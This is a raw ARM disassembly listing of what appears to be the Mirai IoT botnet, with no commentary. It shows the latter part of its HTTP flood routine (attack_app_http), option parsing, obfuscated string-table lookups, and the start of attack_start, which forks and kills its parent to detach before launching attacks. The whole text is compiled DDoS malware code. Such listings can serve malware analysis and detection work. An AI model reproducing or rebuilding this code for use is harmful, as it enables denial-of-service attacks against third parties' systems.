    99e0:	e1a04000 	mov	r4, r0
    99e4:	e0601001 	rsb	r1, r0, r1
    99e8:	e51f29a4 	ldr	r2, [pc, #-2468]	; 904c <attack_app_http+0xe7c>
    99ec:	e1a03008 	mov	r3, r8
    99f0:	e1a00006 	mov	r0, r6
    99f4:	eb0036fb 	bl	175e8 <util_memsearch>
    99f8:	e59a3010 	ldr	r3, [sl, #16]
    99fc:	e0805004 	add	r5, r0, r4
    9a00:	e0892005 	add	r2, r9, r5
    9a04:	e3a0b000 	mov	fp, #0
    9a08:	e3530004 	cmp	r3, #4
    9a0c:	e5c2b843 	strb	fp, [r2, #2115]	; 0x843
    9a10:	da000059 	ble	9b7c <attack_app_http+0x19ac>
    9a14:	e3e03000 	mvn	r3, #0
    9a18:	e3a0200a 	mov	r2, #10
    9a1c:	e58a300c 	str	r3, [sl, #12]
    9a20:	e54a25a8 	strb	r2, [sl, #-1448]	; 0xfffffa58
    9a24:	eafffb7a 	b	8814 <attack_app_http+0x644>
    9a28:	e3a0c007 	mov	ip, #7
    9a2c:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    9a30:	e581c16c 	str	ip, [r1, #364]	; 0x16c
    9a34:	e5d63004 	ldrb	r3, [r6, #4]
    9a38:	e3530073 	cmp	r3, #115	; 0x73
    9a3c:	028cc001 	addeq	ip, ip, #1
    9a40:	0581c16c 	streq	ip, [r1, #364]	; 0x16c
    9a44:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    9a48:	e592116c 	ldr	r1, [r2, #364]	; 0x16c
    9a4c:	e1a00006 	mov	r0, r6
    9a50:	e0612005 	rsb	r2, r1, r5
    9a54:	e0861001 	add	r1, r6, r1
    9a58:	eb003b34 	bl	18730 <__GI_memmove>
    9a5c:	e28d3a05 	add	r3, sp, #20480	; 0x5000
    9a60:	e583716c 	str	r7, [r3, #364]	; 0x16c
    9a64:	e59de010 	ldr	lr, [sp, #16]
    9a68:	e7de0004 	ldrb	r0, [lr, r4]
    9a6c:	e3500000 	cmp	r0, #0
    9a70:	0a00000e 	beq	9ab0 <attack_app_http+0x18e0>
    9a74:	e350002f 	cmp	r0, #47	; 0x2f
    9a78:	01a02006 	moveq	r2, r6
    9a7c:	0a00003b 	beq	9b70 <attack_app_http+0x19a0>
    9a80:	e1a01007 	mov	r1, r7
    9a84:	ea000001 	b	9a90 <attack_app_http+0x18c0>
    9a88:	e350002f 	cmp	r0, #47	; 0x2f
    9a8c:	0a000037 	beq	9b70 <attack_app_http+0x19a0>
    9a90:	e281c001 	add	ip, r1, #1
    9a94:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    9a98:	e582c16c 	str	ip, [r2, #364]	; 0x16c
    9a9c:	e7dc0006 	ldrb	r0, [ip, r6]
    9aa0:	e3500000 	cmp	r0, #0
    9aa4:	e1a0100c 	mov	r1, ip
    9aa8:	e086200c 	add	r2, r6, ip
    9aac:	1afffff5 	bne	9a88 <attack_app_http+0x18b8>
    9ab0:	e1a00006 	mov	r0, r6
    9ab4:	eb00369d 	bl	17530 <util_strlen>
    9ab8:	e3500000 	cmp	r0, #0
    9abc:	da000006 	ble	9adc <attack_app_http+0x190c>
    9ac0:	e1a00006 	mov	r0, r6
    9ac4:	eb003699 	bl	17530 <util_strlen>
    9ac8:	e350007f 	cmp	r0, #127	; 0x7f
    9acc:	d2890fc5 	addle	r0, r9, #788	; 0x314
    9ad0:	d2800001 	addle	r0, r0, #1
    9ad4:	d1a01006 	movle	r1, r6
    9ad8:	db00369e 	blle	17558 <util_strcpy>
    9adc:	e28d3a05 	add	r3, sp, #20480	; 0x5000
    9ae0:	e593016c 	ldr	r0, [r3, #364]	; 0x16c
    9ae4:	e2865001 	add	r5, r6, #1
    9ae8:	e0850000 	add	r0, r5, r0
    9aec:	eb00368f 	bl	17530 <util_strlen>
    9af0:	e35000ff 	cmp	r0, #255	; 0xff
    9af4:	cafffee0 	bgt	967c <attack_app_http+0x14ac>
    9af8:	e2894f85 	add	r4, r9, #532	; 0x214
    9afc:	e2844001 	add	r4, r4, #1
    9b00:	e1a00004 	mov	r0, r4
    9b04:	e3a010ff 	mov	r1, #255	; 0xff
    9b08:	eb0036ad 	bl	175c4 <util_zero>
    9b0c:	e28dca05 	add	ip, sp, #20480	; 0x5000
    9b10:	e59c016c 	ldr	r0, [ip, #364]	; 0x16c
    9b14:	e0850000 	add	r0, r5, r0
    9b18:	eb003684 	bl	17530 <util_strlen>
    9b1c:	e3500000 	cmp	r0, #0
    9b20:	dafffed5 	ble	967c <attack_app_http+0x14ac>
    9b24:	e28dea05 	add	lr, sp, #20480	; 0x5000
    9b28:	e59e116c 	ldr	r1, [lr, #364]	; 0x16c
    9b2c:	e1a00004 	mov	r0, r4
    9b30:	e0851001 	add	r1, r5, r1
    9b34:	eb003687 	bl	17558 <util_strcpy>
    9b38:	eafffecf 	b	967c <attack_app_http+0x14ac>
    9b3c:	e1a00004 	mov	r0, r4
    9b40:	e51f1b04 	ldr	r1, [pc, #-2820]	; 9044 <attack_app_http+0xe74>
    9b44:	eb003771 	bl	17910 <util_strcmp>
    9b48:	e3500000 	cmp	r0, #0
    9b4c:	1affff90 	bne	9994 <attack_app_http+0x17c4>
    9b50:	e15b0005 	cmp	fp, r5
    9b54:	c3a0300a 	movgt	r3, #10
    9b58:	d3a03001 	movle	r3, #1
    9b5c:	c54a35a8 	strbgt	r3, [sl, #-1448]	; 0xfffffa58
    9b60:	d54a35a8 	strble	r3, [sl, #-1448]	; 0xfffffa58
    9b64:	eaffff8c 	b	999c <attack_app_http+0x17cc>
    9b68:	e54a45a8 	strb	r4, [sl, #-1448]	; 0xfffffa58
    9b6c:	eafffb28 	b	8814 <attack_app_http+0x644>
    9b70:	e3a03000 	mov	r3, #0
    9b74:	e5c23000 	strb	r3, [r2]
    9b78:	eaffffcc 	b	9ab0 <attack_app_http+0x18e0>
    9b7c:	e1a00006 	mov	r0, r6
    9b80:	eb00366a 	bl	17530 <util_strlen>
    9b84:	e350007f 	cmp	r0, #127	; 0x7f
    9b88:	caffffa1 	bgt	9a14 <attack_app_http+0x1844>
    9b8c:	e59a0010 	ldr	r0, [sl, #16]
    9b90:	e1a00380 	lsl	r0, r0, #7
    9b94:	e2800d17 	add	r0, r0, #1472	; 0x5c0
    9b98:	e1a01006 	mov	r1, r6
    9b9c:	e0890000 	add	r0, r9, r0
    9ba0:	eb00366c 	bl	17558 <util_strcpy>
    9ba4:	e59a4010 	ldr	r4, [sl, #16]
    9ba8:	e1a04384 	lsl	r4, r4, #7
    9bac:	e2844d17 	add	r4, r4, #1472	; 0x5c0
    9bb0:	e0894004 	add	r4, r9, r4
    9bb4:	e1a00004 	mov	r0, r4
    9bb8:	eb00365c 	bl	17530 <util_strlen>
    9bbc:	e51f1b7c 	ldr	r1, [pc, #-2940]	; 9048 <attack_app_http+0xe78>
    9bc0:	e0840000 	add	r0, r4, r0
    9bc4:	eb003663 	bl	17558 <util_strcpy>
    9bc8:	e2855003 	add	r5, r5, #3
    9bcc:	e59a1294 	ldr	r1, [sl, #660]	; 0x294
    9bd0:	e0876005 	add	r6, r7, r5
    9bd4:	e0651001 	rsb	r1, r5, r1
    9bd8:	e1a03008 	mov	r3, r8
    9bdc:	e51f2b98 	ldr	r2, [pc, #-2968]	; 904c <attack_app_http+0xe7c>
    9be0:	e1a00006 	mov	r0, r6
    9be4:	eb00367f 	bl	175e8 <util_memsearch>
    9be8:	e59a4010 	ldr	r4, [sl, #16]
    9bec:	e1a04384 	lsl	r4, r4, #7
    9bf0:	e2844d17 	add	r4, r4, #1472	; 0x5c0
    9bf4:	e0895005 	add	r5, r9, r5
    9bf8:	e0894004 	add	r4, r9, r4
    9bfc:	e0855000 	add	r5, r5, r0
    9c00:	e5c5b843 	strb	fp, [r5, #2115]	; 0x843
    9c04:	e1a00004 	mov	r0, r4
    9c08:	eb003648 	bl	17530 <util_strlen>
    9c0c:	e1a01006 	mov	r1, r6
    9c10:	e0840000 	add	r0, r4, r0
    9c14:	eb00364f 	bl	17558 <util_strcpy>
    9c18:	e59a3010 	ldr	r3, [sl, #16]
    9c1c:	e2833001 	add	r3, r3, #1
    9c20:	e58a3010 	str	r3, [sl, #16]
    9c24:	eaffff7a 	b	9a14 <attack_app_http+0x1844>
    9c28:	e2894f85 	add	r4, r9, #532	; 0x214
    9c2c:	e2844001 	add	r4, r4, #1
    9c30:	e1a00004 	mov	r0, r4
    9c34:	e3a010ff 	mov	r1, #255	; 0xff
    9c38:	eb003661 	bl	175c4 <util_zero>
    9c3c:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    9c40:	e592016c 	ldr	r0, [r2, #364]	; 0x16c
    9c44:	e2866001 	add	r6, r6, #1
    9c48:	e0860000 	add	r0, r6, r0
    9c4c:	eb003637 	bl	17530 <util_strlen>
    9c50:	e3500000 	cmp	r0, #0
    9c54:	dafffe88 	ble	967c <attack_app_http+0x14ac>
    9c58:	e28d3a05 	add	r3, sp, #20480	; 0x5000
    9c5c:	e593016c 	ldr	r0, [r3, #364]	; 0x16c
    9c60:	e0860000 	add	r0, r6, r0
    9c64:	eb003631 	bl	17530 <util_strlen>
    9c68:	e35000ff 	cmp	r0, #255	; 0xff
    9c6c:	cafffe82 	bgt	967c <attack_app_http+0x14ac>
    9c70:	e28dca05 	add	ip, sp, #20480	; 0x5000
    9c74:	e59c116c 	ldr	r1, [ip, #364]	; 0x16c
    9c78:	e1a00004 	mov	r0, r4
    9c7c:	e0861001 	add	r1, r6, r1
    9c80:	eb003634 	bl	17558 <util_strcpy>
    9c84:	eafffe7c 	b	967c <attack_app_http+0x14ac>
    9c88:	e3a0c007 	mov	ip, #7
    9c8c:	e28dea05 	add	lr, sp, #20480	; 0x5000
    9c90:	e58ec16c 	str	ip, [lr, #364]	; 0x16c
    9c94:	e5d63004 	ldrb	r3, [r6, #4]
    9c98:	e3530073 	cmp	r3, #115	; 0x73
    9c9c:	028cc001 	addeq	ip, ip, #1
    9ca0:	058ec16c 	streq	ip, [lr, #364]	; 0x16c
    9ca4:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    9ca8:	e592116c 	ldr	r1, [r2, #364]	; 0x16c
    9cac:	e2612001 	rsb	r2, r1, #1
    9cb0:	e0822007 	add	r2, r2, r7
    9cb4:	e0861001 	add	r1, r6, r1
    9cb8:	e1a00006 	mov	r0, r6
    9cbc:	eb003a9b 	bl	18730 <__GI_memmove>
    9cc0:	e3a0c000 	mov	ip, #0
    9cc4:	e28d3a05 	add	r3, sp, #20480	; 0x5000
    9cc8:	e583c16c 	str	ip, [r3, #364]	; 0x16c
    9ccc:	e7d50004 	ldrb	r0, [r5, r4]
    9cd0:	e150000c 	cmp	r0, ip
    9cd4:	0a00000d 	beq	9d10 <attack_app_http+0x1b40>
    9cd8:	e350002f 	cmp	r0, #47	; 0x2f
    9cdc:	01a02006 	moveq	r2, r6
    9ce0:	0a000054 	beq	9e38 <attack_app_http+0x1c68>
    9ce4:	e1a0100c 	mov	r1, ip
    9ce8:	ea000001 	b	9cf4 <attack_app_http+0x1b24>
    9cec:	e350002f 	cmp	r0, #47	; 0x2f
    9cf0:	0a000050 	beq	9e38 <attack_app_http+0x1c68>
    9cf4:	e2811001 	add	r1, r1, #1
    9cf8:	e28dca05 	add	ip, sp, #20480	; 0x5000
    9cfc:	e58c116c 	str	r1, [ip, #364]	; 0x16c
    9d00:	e7d10006 	ldrb	r0, [r1, r6]
    9d04:	e3500000 	cmp	r0, #0
    9d08:	e0862001 	add	r2, r6, r1
    9d0c:	1afffff6 	bne	9cec <attack_app_http+0x1b1c>
    9d10:	e1a00006 	mov	r0, r6
    9d14:	eb003605 	bl	17530 <util_strlen>
    9d18:	e3500000 	cmp	r0, #0
    9d1c:	da000003 	ble	9d30 <attack_app_http+0x1b60>
    9d20:	e1a00006 	mov	r0, r6
    9d24:	eb003601 	bl	17530 <util_strlen>
    9d28:	e350007f 	cmp	r0, #127	; 0x7f
    9d2c:	da000044 	ble	9e44 <attack_app_http+0x1c74>
    9d30:	e28dea05 	add	lr, sp, #20480	; 0x5000
    9d34:	e59e016c 	ldr	r0, [lr, #364]	; 0x16c
    9d38:	e2865001 	add	r5, r6, #1
    9d3c:	e0850000 	add	r0, r5, r0
    9d40:	eb0035fa 	bl	17530 <util_strlen>
    9d44:	e35000ff 	cmp	r0, #255	; 0xff
    9d48:	cafffefc 	bgt	9940 <attack_app_http+0x1770>
    9d4c:	e2894f85 	add	r4, r9, #532	; 0x214
    9d50:	e2844001 	add	r4, r4, #1
    9d54:	e1a00004 	mov	r0, r4
    9d58:	e3a010ff 	mov	r1, #255	; 0xff
    9d5c:	eb003618 	bl	175c4 <util_zero>
    9d60:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    9d64:	e591016c 	ldr	r0, [r1, #364]	; 0x16c
    9d68:	e0850000 	add	r0, r5, r0
    9d6c:	eb0035ef 	bl	17530 <util_strlen>
    9d70:	e3500000 	cmp	r0, #0
    9d74:	dafffef1 	ble	9940 <attack_app_http+0x1770>
    9d78:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    9d7c:	e592116c 	ldr	r1, [r2, #364]	; 0x16c
    9d80:	e1a00004 	mov	r0, r4
    9d84:	e0851001 	add	r1, r5, r1
    9d88:	eb0035f2 	bl	17558 <util_strcpy>
    9d8c:	eafffeeb 	b	9940 <attack_app_http+0x1770>
    9d90:	e28cc001 	add	ip, ip, #1
    9d94:	e085400c 	add	r4, r5, ip
    9d98:	e28dea05 	add	lr, sp, #20480	; 0x5000
    9d9c:	e1a00004 	mov	r0, r4
    9da0:	e58ec16c 	str	ip, [lr, #364]	; 0x16c
    9da4:	eb0035e1 	bl	17530 <util_strlen>
    9da8:	e0844000 	add	r4, r4, r0
    9dac:	e5543001 	ldrb	r3, [r4, #-1]
    9db0:	e3530022 	cmp	r3, #34	; 0x22
    9db4:	1afffec4 	bne	98cc <attack_app_http+0x16fc>
    9db8:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    9dbc:	e591416c 	ldr	r4, [r1, #364]	; 0x16c
    9dc0:	e0854004 	add	r4, r5, r4
    9dc4:	e1a00004 	mov	r0, r4
    9dc8:	eb0035d8 	bl	17530 <util_strlen>
    9dcc:	e0844000 	add	r4, r4, r0
    9dd0:	e5446001 	strb	r6, [r4, #-1]
    9dd4:	eafffebc 	b	98cc <attack_app_http+0x16fc>
    9dd8:	e28d3a05 	add	r3, sp, #20480	; 0x5000
    9ddc:	e593016c 	ldr	r0, [r3, #364]	; 0x16c
    9de0:	e2865001 	add	r5, r6, #1
    9de4:	e0850000 	add	r0, r5, r0
    9de8:	eb0035d0 	bl	17530 <util_strlen>
    9dec:	e35000ff 	cmp	r0, #255	; 0xff
    9df0:	cafffed2 	bgt	9940 <attack_app_http+0x1770>
    9df4:	e2894f85 	add	r4, r9, #532	; 0x214
    9df8:	e2844001 	add	r4, r4, #1
    9dfc:	e1a00004 	mov	r0, r4
    9e00:	e3a010ff 	mov	r1, #255	; 0xff
    9e04:	eb0035ee 	bl	175c4 <util_zero>
    9e08:	e28dca05 	add	ip, sp, #20480	; 0x5000
    9e0c:	e59c016c 	ldr	r0, [ip, #364]	; 0x16c
    9e10:	e0850000 	add	r0, r5, r0
    9e14:	eb0035c5 	bl	17530 <util_strlen>
    9e18:	e3500000 	cmp	r0, #0
    9e1c:	dafffec7 	ble	9940 <attack_app_http+0x1770>
    9e20:	e28dea05 	add	lr, sp, #20480	; 0x5000
    9e24:	e59e116c 	ldr	r1, [lr, #364]	; 0x16c
    9e28:	e1a00004 	mov	r0, r4
    9e2c:	e0851001 	add	r1, r5, r1
    9e30:	eb0035c8 	bl	17558 <util_strcpy>
    9e34:	eafffec1 	b	9940 <attack_app_http+0x1770>
    9e38:	e3a03000 	mov	r3, #0
    9e3c:	e5c23000 	strb	r3, [r2]
    9e40:	eaffffb2 	b	9d10 <attack_app_http+0x1b40>
    9e44:	e2890fc5 	add	r0, r9, #788	; 0x314
    9e48:	e1a01006 	mov	r1, r6
    9e4c:	e2800001 	add	r0, r0, #1
    9e50:	eb0035c0 	bl	17558 <util_strcpy>
    9e54:	eaffffb5 	b	9d30 <attack_app_http+0x1b60>
    9e58:	e3a00056 	mov	r0, #86	; 0x56
    9e5c:	eb002ff2 	bl	15e2c <table_unlock_val>
    9e60:	e3a01000 	mov	r1, #0
    9e64:	e3a00056 	mov	r0, #86	; 0x56
    9e68:	eb002fbe 	bl	15d68 <table_retrieve_val>
    9e6c:	e1a01000 	mov	r1, r0
    9e70:	e2850014 	add	r0, r5, #20
    9e74:	eb0035b7 	bl	17558 <util_strcpy>
    9e78:	e3a00056 	mov	r0, #86	; 0x56
    9e7c:	eb002fc2 	bl	15d8c <table_lock_val>
    9e80:	e59d0030 	ldr	r0, [sp, #48]	; 0x30
    9e84:	e1a01008 	mov	r1, r8
    9e88:	eb0035b2 	bl	17558 <util_strcpy>
    9e8c:	e59d2040 	ldr	r2, [sp, #64]	; 0x40
    9e90:	e28bb001 	add	fp, fp, #1
    9e94:	e2855d31 	add	r5, r5, #3136	; 0xc40
    9e98:	e15b0002 	cmp	fp, r2
    9e9c:	e2855004 	add	r5, r5, #4
    9ea0:	1afff949 	bne	83cc <attack_app_http+0x1fc>
    9ea4:	e59d3024 	ldr	r3, [sp, #36]	; 0x24
    9ea8:	e28dcda1 	add	ip, sp, #10304	; 0x2840
    9eac:	e2833e5a 	add	r3, r3, #1440	; 0x5a0
    9eb0:	e28cc030 	add	ip, ip, #48	; 0x30
    9eb4:	e1a0e427 	lsr	lr, r7, #8
    9eb8:	e283300c 	add	r3, r3, #12
    9ebc:	e24cc024 	sub	ip, ip, #36	; 0x24
    9ec0:	e20770ff 	and	r7, r7, #255	; 0xff
    9ec4:	e58d301c 	str	r3, [sp, #28]
    9ec8:	e58de018 	str	lr, [sp, #24]
    9ecc:	e58dc014 	str	ip, [sp, #20]
    9ed0:	e58d700c 	str	r7, [sp, #12]
    9ed4:	eafff99e 	b	8554 <attack_app_http+0x384>
    9ed8:	e3a00055 	mov	r0, #85	; 0x55
    9edc:	eb002fd2 	bl	15e2c <table_unlock_val>
    9ee0:	e3a01000 	mov	r1, #0
    9ee4:	e3a00055 	mov	r0, #85	; 0x55
    9ee8:	eb002f9e 	bl	15d68 <table_retrieve_val>
    9eec:	e1a01000 	mov	r1, r0
    9ef0:	e2850014 	add	r0, r5, #20
    9ef4:	eb003597 	bl	17558 <util_strcpy>
    9ef8:	e3a00055 	mov	r0, #85	; 0x55
    9efc:	eb002fa2 	bl	15d8c <table_lock_val>
    9f00:	eaffffde 	b	9e80 <attack_app_http+0x1cb0>
    9f04:	e3a00054 	mov	r0, #84	; 0x54
    9f08:	eb002fc7 	bl	15e2c <table_unlock_val>
    9f0c:	e3a01000 	mov	r1, #0
    9f10:	e3a00054 	mov	r0, #84	; 0x54
    9f14:	eb002f93 	bl	15d68 <table_retrieve_val>
    9f18:	e1a01000 	mov	r1, r0
    9f1c:	e2850014 	add	r0, r5, #20
    9f20:	eb00358c 	bl	17558 <util_strcpy>
    9f24:	e3a00054 	mov	r0, #84	; 0x54
    9f28:	eb002f97 	bl	15d8c <table_lock_val>
    9f2c:	eaffffd3 	b	9e80 <attack_app_http+0x1cb0>
    9f30:	e3a00053 	mov	r0, #83	; 0x53
    9f34:	eb002fbc 	bl	15e2c <table_unlock_val>
    9f38:	e3a01000 	mov	r1, #0
    9f3c:	e3a00053 	mov	r0, #83	; 0x53
    9f40:	eb002f88 	bl	15d68 <table_retrieve_val>
    9f44:	e1a01000 	mov	r1, r0
    9f48:	e2850014 	add	r0, r5, #20
    9f4c:	eb003581 	bl	17558 <util_strcpy>
    9f50:	e3a00053 	mov	r0, #83	; 0x53
    9f54:	eb002f8c 	bl	15d8c <table_lock_val>
    9f58:	eaffffc8 	b	9e80 <attack_app_http+0x1cb0>
    9f5c:	e3a00052 	mov	r0, #82	; 0x52
    9f60:	eb002fb1 	bl	15e2c <table_unlock_val>
    9f64:	e3a01000 	mov	r1, #0
    9f68:	e3a00052 	mov	r0, #82	; 0x52
    9f6c:	eb002f7d 	bl	15d68 <table_retrieve_val>
    9f70:	e1a01000 	mov	r1, r0
    9f74:	e2850014 	add	r0, r5, #20
    9f78:	eb003576 	bl	17558 <util_strcpy>
    9f7c:	e3a00052 	mov	r0, #82	; 0x52
    9f80:	eb002f81 	bl	15d8c <table_lock_val>
    9f84:	eaffffbd 	b	9e80 <attack_app_http+0x1cb0>
    9f88:	e3a00051 	mov	r0, #81	; 0x51
    9f8c:	eb002fa6 	bl	15e2c <table_unlock_val>
    9f90:	e3a01000 	mov	r1, #0
    9f94:	e3a00051 	mov	r0, #81	; 0x51
    9f98:	eb002f72 	bl	15d68 <table_retrieve_val>
    9f9c:	e1a01000 	mov	r1, r0
    9fa0:	e2850014 	add	r0, r5, #20
    9fa4:	eb00356b 	bl	17558 <util_strcpy>
    9fa8:	e3a00051 	mov	r0, #81	; 0x51
    9fac:	eb002f76 	bl	15d8c <table_lock_val>
    9fb0:	eaffffb2 	b	9e80 <attack_app_http+0x1cb0>
    9fb4:	e3a00050 	mov	r0, #80	; 0x50
    9fb8:	eb002f9b 	bl	15e2c <table_unlock_val>
    9fbc:	e3a01000 	mov	r1, #0
    9fc0:	e3a00050 	mov	r0, #80	; 0x50
    9fc4:	eb002f67 	bl	15d68 <table_retrieve_val>
    9fc8:	e1a01000 	mov	r1, r0
    9fcc:	e2850014 	add	r0, r5, #20
    9fd0:	eb003560 	bl	17558 <util_strcpy>
    9fd4:	e3a00050 	mov	r0, #80	; 0x50
    9fd8:	eb002f6b 	bl	15d8c <table_lock_val>
    9fdc:	eaffffa7 	b	9e80 <attack_app_http+0x1cb0>
    9fe0:	e3a0004f 	mov	r0, #79	; 0x4f
    9fe4:	eb002f90 	bl	15e2c <table_unlock_val>
    9fe8:	e3a01000 	mov	r1, #0
    9fec:	e3a0004f 	mov	r0, #79	; 0x4f
    9ff0:	eb002f5c 	bl	15d68 <table_retrieve_val>
    9ff4:	e1a01000 	mov	r1, r0
    9ff8:	e2850014 	add	r0, r5, #20
    9ffc:	eb003555 	bl	17558 <util_strcpy>
    a000:	e3a0004f 	mov	r0, #79	; 0x4f
    a004:	eb002f60 	bl	15d8c <table_lock_val>
    a008:	eaffff9c 	b	9e80 <attack_app_http+0x1cb0>
    a00c:	e3a0004e 	mov	r0, #78	; 0x4e
    a010:	eb002f85 	bl	15e2c <table_unlock_val>
    a014:	e3a01000 	mov	r1, #0
    a018:	e3a0004e 	mov	r0, #78	; 0x4e
    a01c:	eb002f51 	bl	15d68 <table_retrieve_val>
    a020:	e1a01000 	mov	r1, r0
    a024:	e2850014 	add	r0, r5, #20
    a028:	eb00354a 	bl	17558 <util_strcpy>
    a02c:	e3a0004e 	mov	r0, #78	; 0x4e
    a030:	eb002f55 	bl	15d8c <table_lock_val>
    a034:	eaffff91 	b	9e80 <attack_app_http+0x1cb0>
    a038:	e3a0004d 	mov	r0, #77	; 0x4d
    a03c:	eb002f7a 	bl	15e2c <table_unlock_val>
    a040:	e3a01000 	mov	r1, #0
    a044:	e3a0004d 	mov	r0, #77	; 0x4d
    a048:	eb002f46 	bl	15d68 <table_retrieve_val>
    a04c:	e1a01000 	mov	r1, r0
    a050:	e2850014 	add	r0, r5, #20
    a054:	eb00353f 	bl	17558 <util_strcpy>
    a058:	e3a0004d 	mov	r0, #77	; 0x4d
    a05c:	eb002f4a 	bl	15d8c <table_lock_val>
    a060:	eaffff86 	b	9e80 <attack_app_http+0x1cb0>
    a064:	e3a0004c 	mov	r0, #76	; 0x4c
    a068:	eb002f6f 	bl	15e2c <table_unlock_val>
    a06c:	e3a01000 	mov	r1, #0
    a070:	e3a0004c 	mov	r0, #76	; 0x4c
    a074:	eb002f3b 	bl	15d68 <table_retrieve_val>
    a078:	e1a01000 	mov	r1, r0
    a07c:	e2850014 	add	r0, r5, #20
    a080:	eb003534 	bl	17558 <util_strcpy>
    a084:	e3a0004c 	mov	r0, #76	; 0x4c
    a088:	eb002f3f 	bl	15d8c <table_lock_val>
    a08c:	eaffff7b 	b	9e80 <attack_app_http+0x1cb0>
    a090:	e3a0004b 	mov	r0, #75	; 0x4b
    a094:	eb002f64 	bl	15e2c <table_unlock_val>
    a098:	e3a01000 	mov	r1, #0
    a09c:	e3a0004b 	mov	r0, #75	; 0x4b
    a0a0:	eb002f30 	bl	15d68 <table_retrieve_val>
    a0a4:	e1a01000 	mov	r1, r0
    a0a8:	e2850014 	add	r0, r5, #20
    a0ac:	eb003529 	bl	17558 <util_strcpy>
    a0b0:	e3a0004b 	mov	r0, #75	; 0x4b
    a0b4:	eb002f34 	bl	15d8c <table_lock_val>
    a0b8:	eaffff70 	b	9e80 <attack_app_http+0x1cb0>
    a0bc:	e3a0004a 	mov	r0, #74	; 0x4a
    a0c0:	eb002f59 	bl	15e2c <table_unlock_val>
    a0c4:	e3a01000 	mov	r1, #0
    a0c8:	e3a0004a 	mov	r0, #74	; 0x4a
    a0cc:	eb002f25 	bl	15d68 <table_retrieve_val>
    a0d0:	e1a01000 	mov	r1, r0
    a0d4:	e2850014 	add	r0, r5, #20
    a0d8:	eb00351e 	bl	17558 <util_strcpy>
    a0dc:	e3a0004a 	mov	r0, #74	; 0x4a
    a0e0:	eb002f29 	bl	15d8c <table_lock_val>
    a0e4:	eaffff65 	b	9e80 <attack_app_http+0x1cb0>
    a0e8:	e3a00049 	mov	r0, #73	; 0x49
    a0ec:	eb002f4e 	bl	15e2c <table_unlock_val>
    a0f0:	e3a01000 	mov	r1, #0
    a0f4:	e3a00049 	mov	r0, #73	; 0x49
    a0f8:	eb002f1a 	bl	15d68 <table_retrieve_val>
    a0fc:	e1a01000 	mov	r1, r0
    a100:	e2850014 	add	r0, r5, #20
    a104:	eb003513 	bl	17558 <util_strcpy>
    a108:	e3a00049 	mov	r0, #73	; 0x49
    a10c:	eb002f1e 	bl	15d8c <table_lock_val>
    a110:	eaffff5a 	b	9e80 <attack_app_http+0x1cb0>
    a114:	e3a00048 	mov	r0, #72	; 0x48
    a118:	eb002f43 	bl	15e2c <table_unlock_val>
    a11c:	e3a01000 	mov	r1, #0
    a120:	e3a00048 	mov	r0, #72	; 0x48
    a124:	eb002f0f 	bl	15d68 <table_retrieve_val>
    a128:	e1a01000 	mov	r1, r0
    a12c:	e2850014 	add	r0, r5, #20
    a130:	eb003508 	bl	17558 <util_strcpy>
    a134:	e3a00048 	mov	r0, #72	; 0x48
    a138:	eb002f13 	bl	15d8c <table_lock_val>
    a13c:	eaffff4f 	b	9e80 <attack_app_http+0x1cb0>

0000a140 <attack_get_opt_str>:
    a140:	e3500000 	cmp	r0, #0
    a144:	e92d4010 	push	{r4, lr}
    a148:	e1a04003 	mov	r4, r3
    a14c:	0a00000d 	beq	a188 <attack_get_opt_str+0x48>
    a150:	e5d13004 	ldrb	r3, [r1, #4]
    a154:	e1530002 	cmp	r3, r2
    a158:	1281c008 	addne	ip, r1, #8
    a15c:	13a0e000 	movne	lr, #0
    a160:	1a000004 	bne	a178 <attack_get_opt_str+0x38>
    a164:	ea00000a 	b	a194 <attack_get_opt_str+0x54>
    a168:	e5dc3004 	ldrb	r3, [ip, #4]
    a16c:	e1530002 	cmp	r3, r2
    a170:	e28cc008 	add	ip, ip, #8
    a174:	0a000006 	beq	a194 <attack_get_opt_str+0x54>
    a178:	e28ee001 	add	lr, lr, #1
    a17c:	e150000e 	cmp	r0, lr
    a180:	e1a0100c 	mov	r1, ip
    a184:	1afffff7 	bne	a168 <attack_get_opt_str+0x28>
    a188:	e1a00004 	mov	r0, r4
    a18c:	e8bd4010 	pop	{r4, lr}
    a190:	e12fff1e 	bx	lr
    a194:	e5914000 	ldr	r4, [r1]
    a198:	eafffffa 	b	a188 <attack_get_opt_str+0x48>

0000a19c <attack_start>:
    a19c:	e92d47f0 	push	{r4, r5, r6, r7, r8, r9, sl, lr}
    a1a0:	e1a09003 	mov	r9, r3
    a1a4:	e1a06000 	mov	r6, r0
    a1a8:	e1a07001 	mov	r7, r1
    a1ac:	e1a0a002 	mov	sl, r2
    a1b0:	e5dd8020 	ldrb	r8, [sp, #32]
    a1b4:	eb004310 	bl	1adfc <__libc_fork>
    a1b8:	e3700001 	cmn	r0, #1
    a1bc:	13a03000 	movne	r3, #0
    a1c0:	03a03001 	moveq	r3, #1
    a1c4:	e3500000 	cmp	r0, #0
    a1c8:	d1a05003 	movle	r5, r3
    a1cc:	c3835001 	orrgt	r5, r3, #1
    a1d0:	e3550000 	cmp	r5, #0
    a1d4:	0a000001 	beq	a1e0 <attack_start+0x44>
    a1d8:	e8bd47f0 	pop	{r4, r5, r6, r7, r8, r9, sl, lr}
    a1dc:	e12fff1e 	bx	lr
    a1e0:	eb004305 	bl	1adfc <__libc_fork>
    a1e4:	e3700001 	cmn	r0, #1
    a1e8:	e1a04000 	mov	r4, r0
    a1ec:	0a000008 	beq	a214 <attack_start+0x78>
    a1f0:	e3500000 	cmp	r0, #0
    a1f4:	1a000008 	bne	a21c <attack_start+0x80>
    a1f8:	e1a00006 	mov	r0, r6
    a1fc:	eb004465 	bl	1b398 <__GI_sleep>
    a200:	eb003744 	bl	17f18 <getppid>
    a204:	e3a01009 	mov	r1, #9
    a208:	eb00377f 	bl	1800c <__GI_kill>
    a20c:	e1a00004 	mov	r0, r4
    a210:	eb0040ec 	bl	1a5c8 <__GI_exit>
    a214:	e1a00005 	mov	r0, r5
    a218:	eb0040ea 	bl	1a5c8 <__GI_exit>
    a21c:	e59f306c 	ldr	r3, [pc, #108]	; a290 <attack_start+0xf4>
    a220:	e5d31000 	ldrb	r1, [r3]
    a224:	e3510000 	cmp	r1, #0
